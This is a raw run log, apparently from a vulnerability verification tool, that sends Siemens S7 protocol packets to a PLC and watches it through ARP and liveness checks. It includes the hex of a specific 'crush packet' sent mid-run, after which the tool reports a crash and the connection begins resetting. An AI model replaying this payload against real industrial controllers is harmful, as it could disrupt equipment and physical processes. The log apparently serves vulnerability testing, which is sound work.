[2021-12-19 19:57:05,666] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 19:57:05,731] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-12-19 19:57:05,732] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-12-19 19:57:05,733] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 19:57:05,733] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 13
[2021-12-19 19:57:05,735] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-12-19 19:57:05,938] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-12-19 19:57:06,140] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-12-19 19:57:06,356] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-12-19 19:57:06,562] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-12-19 19:57:06,767] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000700000800080001120411440100ff090004001c0000
[2021-12-19 19:57:06,971] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-12-19 19:57:07,174] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-12-19 19:57:07,380] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:07,584] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:07,790] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000c00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:07,996] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000d00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:08,201] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000e00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:08,665] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 19:57:08,666] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100000f00000e00000401120a10010003000083000001
[2021-12-19 19:57:08,870] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001000000800080001120411440100ff090004001c0000
[2021-12-19 19:57:09,074] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001100000800080001120411440100ff090004001c0000
[2021-12-19 19:57:09,276] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001200000800080001120411440100ff090004001c0000
[2021-12-19 19:57:09,481] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001300000800080001120411440100ff090004001c0000
[2021-12-19 19:57:09,697] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001400000800080001120411440100ff090004001c0000
[2021-12-19 19:57:09,904] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001500000800080001120411440100ff090004001c0000
[2021-12-19 19:57:10,110] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001600000800080001120411440100ff090004001c0000
[2021-12-19 19:57:10,316] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001700000800080001120411440100ff090004001c0000
[2021-12-19 19:57:10,522] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001800000800080001120411440100ff090004001c0000
[2021-12-19 19:57:10,727] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001900000800080001120411440100ff090004001c0000
[2021-12-19 19:57:10,930] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001a00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:11,137] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001b00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:11,344] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001c00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:11,551] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001d00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:11,754] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001e00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:11,961] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001f00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:12,166] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002000000800080001120411440100ff090004001c0000
[2021-12-19 19:57:12,374] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002100000800080001120411440100ff090004001c0000
[2021-12-19 19:57:12,578] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002200000800080001120411440100ff090004001c0000
[2021-12-19 19:57:12,781] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002300000800080001120411440100ff090004001c0000
[2021-12-19 19:57:12,988] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002400000800080001120411440100ff090004001c0000
[2021-12-19 19:57:13,195] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002500000800080001120411440100ff090004001c0000
[2021-12-19 19:57:13,400] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002600000800080001120411440100ff090004001c0000
[2021-12-19 19:57:13,604] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002700000800080001120411440100ff090004001c0000
[2021-12-19 19:57:13,808] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002800000800080001120411440100ff090004001c0000
[2021-12-19 19:57:14,014] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002900000800080001120411440100ff090004001c0000
[2021-12-19 19:57:14,220] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002a00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:14,425] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002b00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:14,629] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:14,836] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002d00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:15,043] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:15,250] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:15,455] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003000000800080001120411440100ff090004001c0000
[2021-12-19 19:57:15,659] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-12-19 19:57:15,860] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003200000800080001120411440100ff090004001c0000
[2021-12-19 19:57:16,063] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-12-19 19:57:16,268] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-12-19 19:57:16,474] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-12-19 19:57:16,681] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-12-19 19:57:16,890] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003700000800080001120411440100ff090004001c0000
[2021-12-19 19:57:17,096] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-12-19 19:57:17,311] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003900000800080001120411440100ff090004001c0000
[2021-12-19 19:57:17,515] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:17,719] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 19:57:17,720] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:17,926] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:23,950] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:23,951] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 58 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:23,961] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:24,171] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:24,179] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:24,179] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 59 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:24,181] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:24,388] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:24,400] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:24,400] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 60 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:24,402] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:24,610] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:24,627] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:24,627] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 61 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:24,629] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:24,843] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:24,859] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:24,860] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 62 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:24,861] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-12-19 19:57:25,077] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:25,088] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:25,089] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 63 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:25,097] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-12-19 19:57:25,310] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:25,317] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:25,317] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 64 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:25,319] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-12-19 19:57:25,526] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:25,542] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:25,544] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 65 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:25,550] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004300000800080001120411440100ff090004001c0000
[2021-12-19 19:57:25,761] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:25,773] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:25,774] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 66 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:25,777] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-12-19 19:57:25,979] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:25,987] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:25,988] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 67 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:25,990] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004500000800080001120411440100ff090004001c0000
[2021-12-19 19:57:26,197] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:26,207] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:26,207] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 68 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:26,209] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004600000800080001120411440100ff090004001c0000
[2021-12-19 19:57:26,415] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:26,425] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:26,426] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 69 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:26,427] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-12-19 19:57:26,635] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:26,648] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:26,648] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 70 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:26,651] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-12-19 19:57:26,852] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:26,859] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:26,860] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 71 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:26,862] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004900000800080001120411440100ff090004001c0000
[2021-12-19 19:57:27,071] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:27,082] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:27,083] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 72 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:27,085] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:27,289] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:27,302] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:27,302] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 73 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:27,304] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:27,507] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:27,518] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:27,518] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 74 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:27,520] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:27,726] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:27,740] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:27,742] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 75 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:27,747] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:27,961] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:27,973] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:27,973] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 76 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:27,975] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:28,179] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:28,189] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:28,190] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 77 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:28,191] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004f00000800080001120411440100ff090004001c0000
[2021-12-19 19:57:28,397] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:28,412] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:28,414] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 78 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:28,419] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005000000800080001120411440100ff090004001c0000
[2021-12-19 19:57:28,632] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:28,643] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:28,644] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 79 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:28,646] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005100000800080001120411440100ff090004001c0000
[2021-12-19 19:57:28,850] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:28,862] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:28,862] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 80 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:28,864] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005200000800080001120411440100ff090004001c0000
[2021-12-19 19:57:29,069] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:29,079] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:29,079] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 81 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:29,081] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 19:57:29,287] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:29,303] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:29,305] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 82 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:29,308] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 19:57:29,522] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:29,529] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:29,529] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 83 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:29,530] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 19:57:29,741] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:29,753] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:29,754] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 84 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:29,755] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 19:57:29,957] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:29,969] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:29,970] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 85 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:29,971] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 19:57:30,176] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:30,191] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:30,192] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 86 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:30,197] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 19:57:30,409] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:30,416] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:30,417] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 87 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:30,418] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 19:57:30,626] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:30,633] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:30,633] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 88 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:30,634] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 19:57:30,842] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:30,852] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:30,853] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 89 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:30,854] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 19:57:31,064] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:31,070] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:31,070] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 90 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:31,071] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 19:57:31,280] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:57:31,290] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 19:57:31,290] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 91 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 19:57:31,292] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
